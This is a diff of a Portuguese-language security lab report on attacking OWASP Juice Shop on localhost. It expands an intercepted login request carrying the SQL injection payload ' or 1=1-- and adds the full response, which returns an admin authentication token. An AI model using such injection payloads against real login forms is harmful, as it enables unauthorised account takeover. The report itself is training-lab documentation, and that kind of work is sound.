@@ -80,12 +80,28 @@ O navegador embutido do Burp Suite foi utilizado para rotear o tráfego automati
 
 * Requisição Enviada (Interceptada): 
 
-   ```http
-   POST /rest/user/login HTTP/1.1
-   Host: localhost:3000
-   Content-Type: application/json
+  ```http
+  POST /rest/user/login HTTP/1.1
+  Host: localhost:3000
+  Content-Length: 39
+  sec-ch-ua-platform: "Windows"
+  Accept-Language: pt-BR,pt;q=0.9
+  Accept: application/json, text/plain, */*
+  sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+  Content-Type: application/json
+  sec-ch-ua-mobile: ?0
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+  Origin: http://localhost:3000
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-Mode: cors
+  Sec-Fetch-Dest: empty
+  Referer: http://localhost:3000/
+  Connection: keep-alive
 
-   {"email":"' or 1=1--","password":"123"}
+  {
+    "email":"' or 1=1--",
+    "password":"123"
+  }
 
 * Resposta Obtida: 
 
@@ -94,6 +110,22 @@ O navegador embutido do Burp Suite foi utilizado para rotear o tráfego automati
    Content-Type: application/json; charset=utf-8
 
    {"authentication":{"umail":"admin@juice-sh.op","id":1,"token":"eyJhbGciOiJIUzI1..."}}
+
+   HTTP/1.1 200 OK
+   Access-Control-Allow-Origin: *
+   X-Content-Type-Options: nosniff
+   X-Frame-Options: SAMEORIGIN
+   Feature-Policy: payment 'self'
+   X-Recruiting: /#/jobs
+   Content-Type: application/json; charset=utf-8
+   Content-Length: 799
+   ETag: W/"31f-3vWb/KqSX6MtoxyknDTPLY2rKyo"
+   Vary: Accept-Encoding
+   Date: Fri, 20 Feb 2026 02:44:57 GMT
+   Connection: keep-alive
+   Keep-Alive: timeout=5
+
+   {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMjAgMDI6Mzg6MjMuNDAxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMjAgMDI6Mzg6MjMuNDAxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTU1NTQ5OH0.jBX9_rtnd4fOpkdvjyx94gV3LIGuKP4vsp73kFb_qrsGfGqfGGTCKS8BlIiEeMkT20dfUHH6W9uIFITtL8voPteR4xVePsGTgvckYCaGx3TtVHi1zAI8rIFmJjoK_ajZ5isMrKRXHBeglEavpBsACJXICL4ZGM4-YMmgEGJmopo","bid":1,"umail":"admin@juice-sh.op"}}
 
 * Evidência Visual: 
 
